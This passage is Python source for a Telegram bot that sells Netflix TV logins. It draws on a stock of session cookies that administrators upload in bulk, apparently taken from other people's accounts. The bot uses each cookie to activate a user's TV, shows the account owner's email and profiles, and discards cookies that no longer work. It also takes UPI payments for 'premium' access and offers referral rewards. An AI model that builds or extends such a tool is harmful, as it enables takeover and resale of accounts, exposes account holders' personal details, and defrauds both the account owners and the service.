            except Exception as e:
                kill_cookie(current_cookie)
                if attempt < 10:
                    current_cookie = pop_cookie()
                    if not current_cookie: break
        safe_edit("😔 *QR Activation failed* after 10 attempts.", chat_id, smsg.message_id, parse_mode="Markdown", reply_markup=menu_kb(uid))
    run_bg(run)

@bot.message_handler(func=lambda m: m.from_user.id in _pending_tv and m.chat.type == "private")
def handle_tv_code(msg):
    uid  = msg.from_user.id
    code = msg.text.strip().replace("-", "").replace(" ", "")
    
    if code.startswith("/"):
        return

    if not code.isdigit() or len(code) != 8:
        safe_send(bot.reply_to, msg, "⚠️ Send an *8-digit* numeric code (e.g. `12345678`).", parse_mode="Markdown")
        return

    data = _pending_tv.pop(uid, None)
    if not data: return
    cookie = data["cookie"]

    original_msg = msg
    smsg = safe_send(bot.reply_to, original_msg,
                     "⏳ *Processing…*\n`Launching browser`",
                     parse_mode="Markdown")
    if not smsg:
        return
    _do_tv_activate_with_smsg(uid, cookie, code, original_msg, smsg)




def _do_tv_activate_with_smsg(uid, cookie, code, chat_ref, smsg):
    chat_id = chat_ref.chat.id if hasattr(chat_ref, "chat") else chat_ref
    lim     = PREMIUM_DAILY_LIMIT if is_premium(uid) else NORMAL_DAILY_LIMIT

    def run():
        current_cookie = cookie
        for attempt in range(1, 11): # Try up to 10 times
            proxy = _next_proxy()
            try:
                step = f"🍪 Verifying cookie {attempt}/10..."
                safe_edit(f"⏳ *Processing…*\n`{step}`", chat_id, smsg.message_id, parse_mode="Markdown")
                
                ok, sc, details = tv_activate_new(current_cookie, code, proxy)
                
                if ok:
                    # Success!
                    increment_daily_usage(uid)
                    # Details formatting
                    acc_info = f"✅ *TV Activated!*\n{'━'*24}\n"
                    if isinstance(details, dict):
                        acc_info += f"📧 Email: `{details.get('Account Email', 'N/A')}`\n"
                        acc_info += f"📅 Renew: `{details.get('Renew Cycle', 'N/A')}`\n"
                        acc_info += f"👥 Profiles: {', '.join(details.get('Profiles', []))}\n"
                    
                    acc_info += f"📊 Usage today: `{get_daily_usage(uid)}/{lim}`"
                    
                    try:
                        bot.delete_message(chat_id, smsg.message_id)
                    except:
                        pass
                        
                    with open(sc, "rb") as f:
                        safe_send(bot.send_photo, chat_id, f,
                                  caption=acc_info, parse_mode="Markdown",
                                  reply_markup=menu_kb(uid))
                    return
                else:
                    # Failed with this cookie
                    kill_cookie(current_cookie) # Delete dead cookie
                    if attempt < 10:
                        current_cookie = pop_cookie() # Get next cookie
                        if not current_cookie:
                            break
                    continue
                    
            except Exception as e:
                logger.error(f"Attempt {attempt} failed: {e}")
                kill_cookie(current_cookie)
                if attempt < 10:
                    current_cookie = pop_cookie()
                    if not current_cookie:
                        break
        
        safe_edit(
            f"😔 *Activation failed*\n{'━'*24}\nCould not find a working cookie after 10 attempts or stock is empty.",
            chat_id, smsg.message_id,
            parse_mode="Markdown", reply_markup=menu_kb(uid),
        )

    run_bg(run)


# ── Invite ────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("invite:"))
def cb_invite(call):
    uid  = call.from_user.id
    link = f"https://t.me/{get_bot_info().username}?start=ref_{uid}"
    kb   = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"🤝 *INVITE & EARN*\n{'━'*28}\n\n"
            f"📊 Referrals: `{get_refs(uid)}`\n\n"
            f"🎁 *1 referral = 1 free TV login*\n\n"
            f"🔗 Your invite link:\n`{link}`\n\n"
            f"_Share with friends to get free logins!_",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
            reply_markup=kb,
        )
    except:
        pass


@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_premium:"))
def cb_buy_premium(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "")
    
    pay_kb = InlineKeyboardMarkup()
    pay_kb.row(InlineKeyboardButton("✅ I've Paid — Submit UTR", callback_data=f"paid_premium:{uid}"))
    pay_kb.row(InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}"))
    
    caption = (
        f"👑 *UPGRADE TO PREMIUM*\n{'━'*28}\n\n"
        f"✅ 5 TV logins/day (vs 3 free)\n"
        f"✅ Skip channel join requirements\n"
        f"✅ Priority activation\n"
        f"✅ 30 days duration\n\n"
        f"💰 Price: *₹{PREMIUM_COST_RS}*\n"
        f"💳 UPI ID: `{UPI_ID}`\n\n"
        f"📸 *Pay using the QR code above and send the UTR.*"
    )
    
    try:
        qr_path = "image.png"
        with open(qr_path, "rb") as qr:
            bot.send_photo(call.message.chat.id, qr,
                           caption=caption, parse_mode="Markdown",
                           reply_markup=pay_kb)
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
    except Exception:
        try:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id,
                                  parse_mode="Markdown", reply_markup=pay_kb)
        except:
            pass


@bot.callback_query_handler(func=lambda c: c.data.startswith("paid_premium:"))
def cb_paid_premium(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "")
    _pending_utr[uid] = {"step": "utr"}
    try:
        bot.edit_message_caption(
            f"📋 *PAYMENT VERIFICATION*\n{'━'*28}\n\n"
            f"Send your *12-digit UTR / Transaction ID*\n"
            f"_(from your UPI app after payment)_\n\n"
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
        )
    except:
        safe_msg(call.message.chat.id,
                 "📋 Send your *12-digit UTR / Transaction ID*:",
                 parse_mode="Markdown")


@bot.message_handler(func=lambda m: m.from_user.id in _pending_utr and
                      _pending_utr[m.from_user.id].get("step") == "utr")
def handle_utr(msg):
    uid = msg.from_user.id
    utr = msg.text.strip()

    if utr.startswith("/"):
        return

    if not utr.isdigit() or len(utr) != 12:
        safe_send(bot.reply_to, msg,
                  "⚠️ Invalid UTR. Send a *12-digit* numeric Transaction ID.",
                  parse_mode="Markdown")
        return

    _pending_utr.pop(uid, None)
    save_pending_payment(uid, utr)

    try:
        u    = bot.get_chat(uid)
        name = u.first_name or u.username or str(uid)
        uname = f"@{u.username}" if u.username else "no username"
    except:
        name  = str(uid)
        uname = "unknown"

    approval_kb = InlineKeyboardMarkup()
    approval_kb.row(
        InlineKeyboardButton("✅ Approve", callback_data=f"approve_premium:{uid}"),
        InlineKeyboardButton("❌ Reject",  callback_data=f"reject_premium:{uid}"),
    )
    try:
        bot.send_message(
            APPROVAL_GROUP_ID,
            f"💰 *NEW PREMIUM PAYMENT*\n{'━'*28}\n\n"
            f"👤 Name: {name}\n"
            f"🔗 Username: {uname}\n"
            f"🆔 UID: `{uid}`\n"
            f"💳 UTR: `{utr}`\n"
            f"💵 Amount: ₹{PREMIUM_COST_RS}\n\n"
            f"{'━'*28}\n"
            f"Any group member can approve or reject:",
            parse_mode="Markdown",
            reply_markup=approval_kb,
        )
    except Exception as e:
        for admin in ADMIN_IDS:
            try:
                bot.send_message(admin,
                    f"⚠️ Approval group unreachable!\n"
                    f"Manual approval needed:\n"
                    f"UID `{uid}` — UTR `{utr}`\n"
                    f"Use /grantpremium {uid}",
                    parse_mode="Markdown")
            except:
                pass

    safe_send(bot.reply_to, msg,
              f"⏳ *Payment submitted!*\n{'━'*28}\n\n"
              f"💳 UTR: `{utr}`\n\n"
              f"Premium will be activated within *30 minutes* after verification.\n\n"
              f"_Thank you!_ 🙏",
              parse_mode="Markdown",
              reply_markup=menu_kb(uid))


@bot.callback_query_handler(func=lambda c: c.data.startswith("approve_premium:"))
def cb_approve_premium(call):
    uid = int(call.data.split(":")[1])
    grant_premium(uid, days=30)
    clear_pending_payment(uid)

    actor = call.from_user.first_name or str(call.from_user.id)
    bot.answer_callback_query(call.id, "✅ Approved!")
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.edit_message_text(
            call.message.text + f"\n\n✅ *Approved by {actor}*",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
        )
    except:
        pass

    safe_msg(
        uid,
        f"🎉 *PREMIUM ACTIVATED!*\n{'━'*28}\n\n"
        f"👑 *30 days* of Premium access!\n\n"
        f"✅ 5 TV logins/day\n"
        f"✅ Skip channel join requirements\n"
        f"✅ Priority activation\n\n"
        f"_Enjoy Netflix on your TV!_ 📺",
        parse_mode="Markdown",
        reply_markup=menu_kb(uid),
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("reject_premium:"))
def cb_reject_premium(call):
    uid = int(call.data.split(":")[1])
    clear_pending_payment(uid)

    actor = call.from_user.first_name or str(call.from_user.id)
    bot.answer_callback_query(call.id, "❌ Rejected.")
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.edit_message_text(
            call.message.text + f"\n\n❌ *Rejected by {actor}*",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
        )
    except:
        pass

    safe_msg(
        uid,
        f"❌ *Payment not verified*\n{'━'*28}\n\n"
        f"We couldn't verify your payment of ₹{PREMIUM_COST_RS}.\n\n"
        f"Contact support: {SUPPORT_USERNAME}",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton("🆘 Support", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")
        ),
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("back_menu:"))
def cb_back(call):
    uid = call.from_user.id
    _pending_tv.pop(uid, None)
    _pending_utr.pop(uid, None)
    try:
        bot.edit_message_text(
            menu_text(uid), call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=menu_kb(uid)
        )
    except:
        safe_msg(call.message.chat.id, menu_text(uid),
                 parse_mode="Markdown", reply_markup=menu_kb(uid))
    bot.answer_callback_query(call.id, "")


@bot.message_handler(
    func=lambda m: m.chat.id == APPROVAL_GROUP_ID and
                   m.text and m.text.startswith(".setchannel")
)
def cmd_set_channel(msg):
    parts = msg.text.strip().split(None, 3)
    if len(parts) < 4:
        safe_send(bot.reply_to, msg,
                  "⚠️ Usage:\n`.setchannel <@username or -100id> <Display Name> <invite link>`",
                  parse_mode="Markdown")
        return

    channel_id   = parts[1]
    channel_name = parts[2]
    invite_link  = parts[3]

    if not invite_link.startswith("http"):
        safe_send(bot.reply_to, msg, "⚠️ Invite link must start with `https://`", parse_mode="Markdown")
        return

    add_must_join_channel(channel_id, channel_name, invite_link)
    channels = get_must_join_channels()
    safe_send(bot.reply_to, msg,
              f"✅ Channel added: *{channel_name}*\n\n"
              f"📋 Active must-join channels ({len(channels)}):\n" +
              "\n".join(f"• `{ch['id']}` — {ch['name']}" for ch in channels),
              parse_mode="Markdown")


@bot.message_handler(
    func=lambda m: m.chat.id == APPROVAL_GROUP_ID and
                   m.text and (m.text.startswith(".remchannel") or m.text.startswith(".removechannel"))
)
def cmd_remove_channel(msg):
    parts = msg.text.strip().split()
    if len(parts) < 2:
        channels = get_must_join_channels()
        if not channels:
            safe_send(bot.reply_to, msg, "ℹ️ No must-join channels set.")
            return
        safe_send(bot.reply_to, msg,
                  "⚠️ Usage: `.remchannel <@username or -100id>`\n\n"
                  "Active channels:\n" +
                  "\n".join(f"• `{ch['id']}` — {ch['name']}" for ch in channels),
                  parse_mode="Markdown")
        return

    channel_id = parts[1]
    removed    = remove_must_join_channel(channel_id)
    if removed:
        channels = get_must_join_channels()
        safe_send(bot.reply_to, msg,
                  f"✅ Removed `{channel_id}`\n\n"
                  f"📋 Remaining ({len(channels)}):\n" +
                  (("\n".join(f"• `{ch['id']}` — {ch['name']}" for ch in channels)) if channels else "_None_"),
                  parse_mode="Markdown")
    else:
        safe_send(bot.reply_to, msg,
                  f"❌ Channel `{channel_id}` not found.",
                  parse_mode="Markdown")


@bot.message_handler(
    func=lambda m: m.chat.id == APPROVAL_GROUP_ID and
                   m.text and m.text.strip() == ".channels"
)
def cmd_list_channels(msg):
    channels = get_must_join_channels()
    if not channels:
        safe_send(bot.reply_to, msg, "ℹ️ No must-join channels set.")
        return
    safe_send(bot.reply_to, msg,
              f"📋 *Must-join channels* ({len(channels)}):\n" +
              "\n".join(f"• `{ch['id']}` — [{ch['name']}]({ch['link']})" for ch in channels),
              parse_mode="Markdown")


def admin_only(fn):
    def wrap(msg, *a, **kw):
        if msg.from_user.id not in ADMIN_IDS:
            return
        return fn(msg, *a, **kw)
    wrap.__name__ = fn.__name__
    return wrap


@bot.message_handler(commands=["addcookie"])
@admin_only
def cmd_addcookie(msg):
    p = msg.text.split(None, 1)
    if len(p) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/addcookie <cookie>`", parse_mode="Markdown")
        return
    push_cookie(p[1])
    update_pin()
    safe_send(bot.reply_to, msg, f"✅ Added. Stock: `{stock_count()}`", parse_mode="Markdown")


@bot.message_handler(commands=["addstock"])
@admin_only
def cmd_addstock(msg):
    p = msg.text.split(None, 1)
    if len(p) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/addstock <blocks>`", parse_mode="Markdown")
        return
    blocks = [b.strip() for b in p[1].strip().split("\n\n") if b.strip()]
    added  = sum(1 for b in blocks if b and (push_cookie(b) or True))
    update_pin()
    safe_send(bot.reply_to, msg, f"✅ Added *{added}* cookie(s).\n📦 Stock: `{stock_count()}`",
              parse_mode="Markdown")


@bot.message_handler(commands=["stock"])
@admin_only
def cmd_stock(msg):
    safe_send(bot.reply_to, msg, f"📦 Stock: `{stock_count()}` cookie(s)", parse_mode="Markdown")


@bot.message_handler(commands=["grantpremium"])
@admin_only
def cmd_grant_premium(msg):
    parts = msg.text.strip().split()
    if len(parts) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/grantpremium <uid> [days]`", parse_mode="Markdown")
        return
    try:
        target_uid = int(parts[1])
        days       = int(parts[2]) if len(parts) > 2 else 30
        grant_premium(target_uid, days)
        safe_send(bot.reply_to, msg, f"✅ Granted `{days}` days premium to `{target_uid}`",
                  parse_mode="Markdown")
        safe_msg(target_uid,
                 f"👑 *Premium Activated!*\n\n✅ {days} days granted!\n5 TV logins/day enabled.",
                 parse_mode="Markdown", reply_markup=menu_kb(target_uid))
    except Exception as e:
        safe_send(bot.reply_to, msg, f"❌ Error: {e}")


@bot.message_handler(func=lambda m: m.chat.id == APPROVAL_GROUP_ID and m.text and m.text.startswith(".msg"))
def cmd_broadcast_hidden(msg):
    text = msg.text.replace(".msg", "").strip()
    if not text:
        return
    
    def do_broadcast():
        with db() as c:
            users = c.execute("SELECT uid FROM users").fetchall()
        
        count = 0
        safe_msg(msg.chat.id, f"🚀 Starting broadcast to {len(users)} users...")
        
        for (target_uid,) in users:
            try:
                bot.send_message(target_uid, text)
                count += 1
                if count % 30 == 0:
                    time.sleep(1)
            except Exception as e:
                if _is_fatal(e):
                    continue
        
        safe_msg(msg.chat.id, f"✅ Broadcast finished. Sent to {count} users.")

    threading.Thread(target=do_broadcast, daemon=True).start()


@bot.message_handler(content_types=["document"], func=lambda m: m.chat.id == APPROVAL_GROUP_ID)
def handle_cookie_file(msg):
    if not msg.document: return
    
    ext = msg.document.file_name.split(".")[-1].lower()
    if ext not in ("txt", "zip", "rar"): return
    
    smsg = bot.reply_to(msg, "⏳ *Processing file…*", parse_mode="Markdown")
    
    try:
        file_info = bot.get_file(msg.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, msg.document.file_name)
        
        with open(file_path, "wb") as f:
            f.write(downloaded_file)
            
        cookies_found = []
        
        if ext == "txt":
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                # Each line is one cookie update
                lines = [l.strip() for l in content.split("\n") if l.strip()]
                for l in lines:
                    if _is_cookie(l):
                        cookies_found.append(l)
                        
        elif ext == "zip":
            with zipfile.ZipFile(file_path, "r") as z:
                for name in z.namelist():
                    if name.endswith(".txt"):
                        with z.open(name) as f:
                            # Each file is one cookie
                            content = f.read().decode("utf-8", errors="ignore").strip()
                            if _is_cookie(content):
                                cookies_found.append(content)
                                    
        elif ext == "rar":
            try:
                if os.name == 'nt':
                    rarfile.UNRAR_TOOL = "unrar.exe"
                else:
                    rarfile.UNRAR_TOOL = "unrar"
                
                rf = rarfile.RarFile(file_path)
                for name in rf.namelist():
                    if name.endswith(".txt"):
                        with rf.open(name) as f:
                            # Each file is one cookie
                            content = f.read().decode("utf-8", errors="ignore").strip()
                            if _is_cookie(content):
                                cookies_found.append(content)
            except Exception as rar_e:
                subprocess.run(["unrar", "x", "-o+", file_path, temp_dir], check=True, capture_output=True)
                for root, _, files in os.walk(temp_dir):
                    for name in files:
                        if name.endswith(".txt"):
                            p = os.path.join(root, name)
                            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                                # Each file is one cookie
                                content = f.read().strip()
                                if _is_cookie(content):
                                    cookies_found.append(content)
        
        added = len(cookies_found)
        if added > 0:
            push_cookies_bulk(cookies_found)
            
        update_pin()
        bot.edit_message_text(f"✅ Processed `{msg.document.file_name}`\n📦 Added *{added}* cookies.\nTotal stock: `{stock_count()}`", 
                             msg.chat.id, smsg.message_id, parse_mode="Markdown")
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error processing file: {e}", msg.chat.id, smsg.message_id)


@bot.channel_post_handler(func=lambda m: m.chat.id == STOCK_CHANNEL_ID and m.text)
def on_stock(msg):
    txt = msg.text.strip()
    if not txt.startswith("/") and _is_cookie(txt):
        push_cookie(txt, msg_id=msg.message_id)
        update_pin()


@bot.message_handler(commands=["refer", "referral", "invite"])
def cmd_refer(msg):
    if not check_group_restriction(msg): return
    uid  = msg.from_user.id
    _eu(uid)
    link = f"https://t.me/{get_bot_info().username}?start=ref_{uid}"
    refs = get_refs(uid)
    safe_msg(
        msg.chat.id,
        f"🤝 *INVITE & EARN*\n{'━'*28}\n\n"
        f"📊 Referrals: `{refs}`\n\n"
        f"🎁 *1 referral = 1 free TV login*\n\n"
        f"🔗 Your invite link:\n`{link}`\n\n"
        f"_Share with friends to get free logins!_",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}")
        ),
    )


@bot.message_handler(commands=["redeem"])
def cmd_redeem(msg):
    if not check_group_restriction(msg): return
    uid = msg.from_user.id
    _eu(uid)

    not_joined = check_must_join(uid)
    if not_joined:
        kb = build_must_join_kb(not_joined, uid)
        safe_msg(
            msg.chat.id,
            f"📢 *Join required!*\n{'━'*28}\n\n"
            f"Please join the channel{'s' if len(not_joined) > 1 else ''} below to use the bot:\n\n"
            + "\n".join(f"• [{ch['name']}]({ch['link']})" for ch in not_joined) +
            f"\n\n_Tap the button below after joining._",
            parse_mode="Markdown",
            reply_markup=kb,
        )
        return

    can, used, limit = check_rate_limit(uid)
    if not can:
        hint = "" if is_premium(uid) else "\n\n👑 Upgrade to Premium for 5 logins/day!"
        safe_msg(
            msg.chat.id,
            f"⏳ *Daily limit reached*\n{'━'*28}\n\n"
            f"📊 Used: `{used}/{limit}` today\n"
            f"🔄 Resets at midnight UTC{hint}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👑 Buy Premium", callback_data=f"buy_premium:{uid}")
            ),
        )
        return
    if not is_premium(uid) and get_refs(uid) <= 0:
        safe_msg(
            msg.chat.id,
            f"❌ *No credits*\n{'━'*28}\n\n"
            f"You need *1 referral* to get a free TV login.\n\n"
            f"🔗 `https://t.me/{get_bot_info().username}?start=ref_{uid}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👑 Buy Premium", callback_data=f"buy_premium:{uid}"),
                InlineKeyboardButton("🤝 Invite",      callback_data=f"invite:{uid}"),
            ),
        )
        return
    if stock_count() == 0:
        safe_msg(msg.chat.id, "😔 *Out of stock* — check back soon!", parse_mode="Markdown")
        return
    cookie = pop_cookie()
    if not cookie:
        safe_msg(msg.chat.id, "😔 Stock just ran out. Try again later.")
        return
    increment_daily_usage(uid)
    update_pin()
    _pending_tv[uid] = {"cookie": cookie}
    safe_msg(
        msg.chat.id,
        f"📺 *TV Login — Enter Code*\n{'━'*28}\n\n"
        f"📊 Usage today: `{used+1}/{limit}`\n\n"
        f"📟 Send the *8-digit code* shown on your Netflix TV screen:\n\n"
        f"_Example: `12345678`_",
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def cmd_vip(msg):
    if not check_group_restriction(msg): return
    uid = msg.from_user.id
    _eu(uid)
    if is_premium(uid):
        with db() as c:
            r = c.execute("SELECT premium_until FROM users WHERE uid=?", (uid,)).fetchone()
        until = r[0] if r else 0
        days_left = max(0, (until - int(time.time())) // 86400) if until else 999
        safe_msg(
            msg.chat.id,
            f"👑 *YOU ALREADY HAVE PREMIUM*\n{'━'*28}\n\n"
            f"✅ 5 TV logins/day\n"
            f"✅ Skip channel join requirements\n"
            f"✅ Priority activation\n\n"
            f"📅 Days remaining: `{days_left}`",
            parse_mode="Markdown",
            reply_markup=menu_kb(uid),
        )
    else:
        safe_msg(
            msg.chat.id,
            f"👑 *BUY PREMIUM — ₹{PREMIUM_COST_RS}*\n{'━'*28}\n\n"
            f"✅ 5 TV logins/day (vs 3 free)\n"
            f"✅ Skip channel join requirements\n"
            f"✅ Priority activation\n"
            f"✅ 30 days duration\n\n"
            f"Tap below to purchase 👇",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👑 Buy Premium ₹30", callback_data=f"buy_premium:{uid}")
            ),
        )


@bot.message_handler(commands=["bal", "balance"])
def cmd_bal(msg):
    if not check_group_restriction(msg): return
    uid   = msg.from_user.id
    _eu(uid)
    refs  = get_refs(uid)
    used, limit = _limit_info(uid)
    tier  = "👑 Premium" if is_premium(uid) else "🆓 Free"
    bar = get_visual_bar(used, limit)
    safe_msg(
        msg.chat.id,
        f"💳 *YOUR BALANCE*\n{'━'*28}\n\n"
        f"🏷 Tier: {tier}\n"
        f"🤝 Referrals: `{refs}`\n"
        f"🎁 Login credits: `{refs}` available\n\n"
        f"📊 Today's usage:\n"
        f"{bar} `{used}/{limit}`\n\n"
        f"_Each referral = 1 free TV login_",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton("🤝 Invite Friends", callback_data=f"invite:{uid}"),
            InlineKeyboardButton("🔙 Menu",           callback_data=f"back_menu:{uid}"),
        ),
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("profile:"))
def cb_profile(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "")
    refs = get_refs(uid)
    used, limit = _limit_info(uid)
    tier = "👑 Premium" if is_premium(uid) else "🆓 Free"
    bar = get_visual_bar(used, limit)
    
    try:
        bot.edit_message_text(
            f"👤 *YOUR PROFILE*\n{'━'*28}\n\n"
            f"🆔 ID: `{uid}`\n"
            f"🏷 Tier: {tier}\n"
            f"🤝 Referrals: `{refs}`\n\n"
            f"📊 Today's usage:\n"
            f"{bar} `{used}/{limit}`\n",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}")
            ),
        )
    except:
        pass


def register_commands():
    from telebot.types import BotCommand
    commands = [
        BotCommand("start",   "🏠 Open main menu"),
        BotCommand("redeem",  "📺 TV Login — use your credits"),
        BotCommand("refer",   "🤝 Invite friends & earn logins"),
        BotCommand("bal",     "💳 Your balance, referrals & daily limit"),
        BotCommand("vip",     "👑 Buy Premium or check VIP status"),
    ]
    try:
        bot.set_my_commands(commands)
        print("[BOT] Commands registered ✓")
    except Exception as e:
        print(f"[BOT] Failed to register commands: {e}")



@bot.message_handler(content_types=["photo"], func=lambda m: m.chat.type == "private")
def handle_qr_photo(msg):
    uid = msg.from_user.id
    _eu(uid)
    
    file_info = bot.get_file(msg.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    qr_url = scan_qr(downloaded_file)
    if not qr_url:
        return

    # QR detected, now check premium status
    if not is_premium(uid):
        safe_msg(msg.chat.id, 
                 f"👑 *PREMIUM FEATURE*\\n{'━'*28}\\n\\n"
                 f"QR Code activation is only available for *Premium* users.\\n\\n"
                 f"Free users can still use the **8-digit code** method.",
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup().row(
                     InlineKeyboardButton("👑 Get Premium", callback_data=f"buy_premium:{uid}")
                 ))
        return

    used, limit = _limit_info(uid)
    if used >= limit:
        safe_msg(msg.chat.id, "⚠️ Daily limit reached.")
        return

    # If it's a Netflix QR, proceed with activation
    if stock_count() == 0:
        safe_msg(msg.chat.id, "😔 Out of stock.")
        return
        
    # If they were already in a pending state, use that cookie, otherwise pop a new one
    data = _pending_tv.pop(uid, None)
    cookie = data["cookie"] if data else pop_cookie()
    
    if not cookie:
        safe_msg(msg.chat.id, "😔 Stock just ran out.")
        return

    smsg = safe_send(bot.reply_to, msg, "⏳ *QR Detected! Processing...*", parse_mode="Markdown")
    _do_tv_qr_activate(uid, cookie, qr_url, msg, smsg)


if __name__ == "__main__":
    init_db()
    print("[BOT] Starting…")
    register_commands()
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except KeyboardInterrupt:
        print("[BOT] Stopped")
